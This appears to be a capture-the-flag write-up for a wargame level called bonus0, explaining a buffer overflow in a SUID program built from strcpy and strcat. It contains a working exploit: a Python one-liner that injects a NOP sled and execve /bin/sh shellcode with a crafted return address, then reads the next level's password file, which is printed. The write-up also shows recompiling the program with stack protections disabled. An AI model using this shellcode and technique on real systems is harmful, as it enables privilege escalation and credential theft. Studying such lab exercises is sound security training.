# ------------------------------------------------------------------------
# Obtain the next password
# ------------------------------------------------------------------------

# We will overwrite return address of main to call the shellcode payload in function p()'s local buffer.

# The first input will result in a non-NULL terminated string a = "AAAA...."
# The second input will effectively become part of string a.

	first input  = AAAAAAAAAAAAAAAAAAA	(20 + many bytes, containing shellcode)
	second input = BBBBBBBBBBBBBXXXXB   (19 bytes, containing payload return address)

	a = "AAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBXXXXB"
	b = "BBBBBBBBBBBBBBXXXXB"

# strcpy(buffer, a) results in buffer containing a string of 39 chars.

	buffer = "AAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBXXXXB"

# buffer is appended with ' ', now 40 chars.

	buffer = "AAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBXXXXB "

# strcat(buffer, b) appends 19 chars.  Now buffer contains 59 chars.

	buffer = "AAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBXXXXB BBBBBBBBBBBBBBXXXXB"

# These strings have been crafted to overwrite main()'s return address at main.buffer[54]

# main() stack state:
	return address		4 bytes
	old ebp				4 bytes
	esp alignment		8 bytes
	main.buffer			42 bytes


# The crafted return address will point to somewhere in the middle of the 2000 byte NOP slide preceeding the shellcode, which remains at p()'s buffer[9 + 4 + 2000].

# target return address = p() buffer address (0xbfffe680) + 20 + 1000 = 0xbfffea7c

# Run the program
(python -c "print('A' * 20 + '\x90' * 2000 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"; python -c "print('B' * 14 + '\xbf\xff\xea\x7c'[::-1] + 'B')"; cat) | ~/bonus0
	
	whoami
	cat /home/user/bonus1/.pass

# Now we can log in as user bonus1
su bonus1
# password: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9



# ------------------------------------------------------------------------
# Recreate the exploitable program
# ------------------------------------------------------------------------

# As user bonus1:

    # Compile the program in /tmp
    gcc bonus0.c -fno-stack-protector -z execstack -o ft_bonus0

    # Edit suid
    chmod u+s ft_bonus0

    # Move the program to home directory
    chmod +wx ~; mv ft_bonus0 ~

# As user bonus0:

	# In this case, p()'s buffer address is similar, so the same target return address works.
	
	# Run the program
	(python -c "print('A' * 20 + '\x90' * 2000 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"; python -c "print('B' * 14 + '\xbf\xff\xea\x7c'[::-1] + 'B')"; cat) | /home/user/bonus1/ft_bonus0


